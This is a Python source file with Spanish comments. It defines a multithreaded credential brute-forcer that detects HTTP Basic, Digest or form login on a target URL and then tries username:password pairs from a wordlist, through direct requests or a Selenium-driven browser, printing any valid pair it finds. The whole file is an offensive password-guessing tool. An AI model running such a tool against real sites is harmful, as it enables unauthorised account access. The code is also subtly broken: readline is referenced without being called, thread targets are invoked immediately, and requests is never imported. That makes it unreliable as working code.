import socket
import threading

from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from htmlstructure import HTML
from HTTPrequest import HTTPrequest
from selenium import webdriver


class Cracker(HTTPrequest):
    def __init__(self, url, dict):
        super().__init__()
        self.url_attack = url
        self.authentication = ""
        self.dictionary = dict
        self.lock_acceso_fichero = threading.Lock()

    def detect_auth(self):
        request = {'method': 'get', 'url': self.url_attack}
        response, result = self.request(request)
        if response.status_code == 200:
            self.authentication = 'form'
        if response.status_code == 401:
            if response.headers['WWW-Authenticate'].find('Basic') != -1:
                self.authentication = 'basic'
            elif response.headers['WWW-Authenticate'].find('Digest') != -1:
                self.authentication = 'digest'

    def workerbasic(self, dict):
        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
        line = dict.readline()
        self.lock_acceso_fichero.release()
        while line != "":
            [username, password] = line.split(sep=':')
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                print('Error en la conexión')
                break
            if response.status_code == 200:
                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
                break
            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
            line = dict.readline
            self.lock_acceso_fichero.release()

    def workerdigest(self, dict):
        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
        line = dict.readline()
        self.lock_acceso_fichero.release()
        while line != "":
            [username, password] = line.split(sep=':')
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                print('Error en la conexión')
                break
            if response.status_code == 200:
                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
                break
            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
            line = dict.readline
            self.lock_acceso_fichero.release()

    def workerform(self, dict):
        driver = webdriver.Safari()
        driver.get(self.url_attack)
        user_box = driver.find_element("id", "username")
        pass_box = driver.find_element("id", "password")
        login = driver.find_element("class_name", "ui-button fn-width80")

        self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
        line = dict.readline()
        self.lock_acceso_fichero.release()
        while line != "":
            [username, password] = line.split(sep=':')
            user_box.send_keys(username)
            pass_box.send_keys(password)
            login.click()
            self.lock_acceso_fichero.acquire()  # pedimos acceso al recurso
            line = dict.readline
            self.lock_acceso_fichero.release()
        driver.close()

    def attack(self):
        self.detect_auth()
        diction = open(self.dictionary)
        thread_count = 4
        threads = []
        for i in range(thread_count):
            if self.authentication == 'basic':
                t = threading.Thread(target=self.workerbasic(diction))
                threads.append(t)
                t.start()
            elif self.authentication == 'digest':
                t = threading.Thread(target=self.workerdigest(diction))
                threads.append(t)
                t.start()
            elif self.authentication == 'form':
                t = threading.Thread(target=self.workerform(diction))
                threads.append(t)
                t.start()

        # Esperamos a que terminen todos los hilos antes de terminar el programa principal
        for thread in threads:
            thread.join()
        diction.close()

    def formcrack(self, username, password):
        result = {'status': 0}
        try:
            response = requests.get(self.url_attack)
        except requests.exceptions.ConnectionError:
            result = {'status': -1}
        except socket.timeout:
            result = {'status': -2}

        if result['status'] < 0:
            print('Error in connection')

        if response.status_code != 200 and response.status_code != 403:
            print('Bad Status code')

        htmlcode = HTML(response.text, "html.parser")
        print(htmlcode)
        login_form = htmlcode.get_login_forms()[0]
        datasend = {'data': {}}

        if not (('usr_field' in login_form) and ('pwd_field' in login_form)):
            print('Error: form incorrect')
        if 'fields' in login_form:
            datasend.update(login_form['fields'])

        datasend['data'][login_form['usr_field']] = username
        datasend['data'][login_form['pwd_field']] = password

        responsepost = requests.post(self.url_attack, data=datasend['data'])
        htmlpost = HTML(responsepost.text, "html.parser")

        if (responsepost.status_code == 200) and (login_form not in htmlpost):
            print('Usuario y contraseña válidos')
        else:
            print('Usuario y contraseña incorrectos')
